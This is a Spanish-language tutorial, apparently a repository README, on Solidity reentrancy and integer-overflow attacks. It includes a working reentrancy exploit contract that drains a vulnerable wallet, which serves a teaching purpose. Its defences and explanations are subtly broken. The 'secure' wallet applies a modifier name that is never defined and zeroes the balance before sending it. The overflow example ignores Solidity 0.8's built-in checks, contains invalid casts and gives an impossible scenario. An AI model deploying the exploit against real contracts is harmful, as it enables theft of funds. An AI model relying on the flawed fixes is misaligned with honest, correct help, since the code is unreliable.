# Solidity_Attacks

### Reentrancy Attack  

Para comprender mejor el ataque de reentrancia, primero debemos entender el funcionamiento de las funciones y las transacciones en Solidity. Cuando se llama a una función en un contrato inteligente, se inicia una nueva transacción en la red de Ethereum. Durante esta transacción, el contrato inteligente realiza ciertas operaciones y puede llamar a otras funciones o enviar Ether a otros contratos o direcciones. Cuando se llama a una función en un contrato inteligente, cualquier código adicional que se ejecute dentro de esa función se ejecuta en el mismo contexto de la transacción original.

Ahora, para entender mejor cómo funciona un ataque de reentrancia, imaginemos que un contrato inteligente tiene una función que permite a los usuarios retirar Ether de su cuenta en el contrato. Esta función, digamos "retirar()", realiza una serie de operaciones, como verificar el saldo de la cuenta del usuario, actualizar el saldo y enviar Ether a la dirección del usuario. Ahora, si un atacante malintencionado crea un contrato que llama a la función "retirar()" del contrato inteligente, pero luego vuelve a llamar a "retirar()" antes de que la transacción original se haya completado, el contrato malintencionado puede seguir retirando Ether del contrato inteligente de manera repetitiva, aprovechando el hecho de que la función "retirar()" aún no ha terminado de ejecutarse.

Para ilustrar esto con un ejemplo de código, aquí hay un contrato inteligente de ejemplo llamado "WalletInsegura.sol", que contiene una función "retirar()" vulnerable al ataque de reentrancia:


**WalletInsegura.sol**

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract WalletInsegura {
    mapping (address => uint256) private balances;

    function balance() external view returns (uint256) {
        return address(this).balance;
    }

    function depositar() external payable {
        balances[msg.sender] += msg.value;
    }

    function retirar() external {
        require(balances[msg.sender] > 0, "Insufficient balance");

        (bool success, ) = payable(msg.sender).call{value: balances[msg.sender]}("");
        require(success, "Error al enviar eth");

        balances[msg.sender] = 0;
    }
}
```

En este contrato, los usuarios pueden depositar Ether en su cuenta en el contrato llamando a la función "deposit()", que simplemente actualiza el saldo del usuario en el mapa "balances". Sin embargo, la función "retirar()" es vulnerable a un ataque de reentrancia. Si un atacante malintencionado crea un contrato que llama repetidamente a "retirar()", como se muestra a continuación, el contrato puede retirar Ether del contrato inteligente de manera repetitiva hasta que se quede sin fondos.

Ahora, crearemos un contrato malintencionado llamado "Ataque.sol" para explotar la vulnerabilidad en el contrato "WalletInsegura.sol". El código para el contrato malintencionado:


**Ataque.sol**  

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface IWallet {
    function depositar() external payable;
    function retirar() external;
}

contract Ataque {
    IWallet public immutable wallet;

    constructor(IWallet _wallet) {
        wallet = _wallet;
    }

    function atacar() external payable {
        require(msg.value == 1 ether, "Insuficiente eth");
        wallet.depositar{value: 1 ether}();
        wallet.retirar();
    }
    
    receive() external payable {
        if (address(wallet).balance >= 1 ether)
            wallet.retirar();
    }

    function balance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

Este contrato malintencionado tiene una función llamada "ataque()" que corrobora que se haya enviado ether suficiente para realizar el ataque, hará un depósito llamando a la función "depositar()" ya que la función "retirar()" requiere que este tenga balance y luego llama a la función "retirar()" nuevamente antes de que se actualice el balance en el contrato vulnerable. 

Finalmente, el contrato malintencionado también tiene una función de fallback que se activa cuando se envía Ether al contrato sin especificar una función. Esta función comprueba el saldo del contrato "WalletInsegura.sol" y llama a la función "retirar()" si hay suficiente saldo disponible. Esto se repite hasta que el contrato malintencionado agota los fondos del contrato "WalletInsegura.sol".


Para protegerse contra el ataque de reentrancia, los desarrolladores deben asegurarse de que las funciones críticas del contrato inteligente estén diseñadas para evitar llamadas repetitivas o llamadas a otras funciones que puedan ser explotadas por un atacante malintencionado. Una forma común de hacerlo es usar el patrón de bloqueo de estado, que bloquea el estado del contrato inteligente durante la ejecución de una función para evitar que otras funciones se llamen antes de que la transacción original se complete.

Aquí está el código completo del contrato seguro "WalletSegura.sol" que utiliza el patrón de bloqueo de estado:


**WalletSegura.sol**
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract WalletSegura {
    bool internal bloqueado;
    mapping (address => uint256) private balances;

    function balance() external view returns (uint256) {
        return address(this).balance;
    }

    function depositar() external payable {
        balances[msg.sender] += msg.value;
    }

    function retirar() external noReentrada{
        require(balances[msg.sender] > 0, "Insufficient balance");
        balances[msg.sender] = 0;
        (bool success, ) = payable(msg.sender).call{value: balances[msg.sender]}("");
        require(success, "Error al enviar eth");
    }

    modifier proteger() {
        require(!bloqueado, "Llamada de ataque");
        bloqueado = true;
        _;
        bloqueado = false;
    }
}
```

En este contrato, se ha agregado una variable booleana "bloqueado" para evitar que las funciones se llamen repetitivamente. La función "retirar()" ahora tiene un modificador personalizado "noReentrada()" que bloquea la función "retirar()" si ya está en ejecución. El modificador establece la variable "bloqueado" en verdadero al inicio de la ejecución de la función y la establece en falso al finalizar. Esto garantiza que la función "retirar()" no se llame repetidamente hasta que se complete la transacción original.


Link: https://www.youtube.com/watch?v=rrvU3DSbXKo  
Repo: https://github.com/meta-dapp/reentracy  



### Integer overflow/underflow attack  

En Solidity, las variables enteras tienen un rango de valores permitidos, que depende del tipo de variable. Por ejemplo, el tipo **uint8** tiene un rango de valores permitidos de 0 a 255, mientras que el tipo **uint256** tiene un rango de valores permitidos de 0 a 2^256-1.

El ataque de desbordamiento de enteros se produce cuando se manipula una variable para que su valor exceda el rango permitido. Esto puede provocar que la variable se desborde y tome un valor incorrecto, lo que puede causar comportamientos inesperados o incluso el bloqueo del contrato.

Por ejemplo, considera el siguiente contrato de Solidity que permite a un usuario apostar en un juego de dados:

```
contract JuegoDeDados {
    uint256 public balance;
    
    function apostar(uint8 _numero) public payable {
        require(msg.value > 0);
        require(_numero >= 1 && _numero <= 6);
        uint8 dado = uint8(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 6 + 1;
        if (dado == _numero) {
            balance += msg.value * 5;
            msg.sender.transfer(msg.value * 5);
        } else {
            balance += msg.value;
        }
    }
}
```

En este contrato, el usuario puede apostar en un número del 1 al 6. Si el número apostado coincide con el número que sale en el dado, el usuario gana cinco veces su apuesta. De lo contrario, el usuario pierde su apuesta. El valor de la apuesta se agrega al balance del contrato.

Sin embargo, hay un problema de desbordamiento de enteros en la línea balance += msg.value * 5;. Si el balance actual es mayor o igual a 2^256-5 y un usuario apuesta la cantidad máxima permitida de ether (que es 2^256-1 wei), entonces el resultado del producto msg.value * 5 excederá el rango permitido y provocará un desbordamiento. Esto hará que el balance tome un valor incorrecto y puede provocar que el contrato no funcione correctamente.

Para evitar este problema, se podría utilizar una librería segura de manejo de enteros, como la librería SafeMath de OpenZeppelin, que se encarga de verificar los límites de los enteros antes de realizar operaciones con ellos. También es importante realizar pruebas exhaustivas del código para identificar y corregir posibles vulnerabilidades.
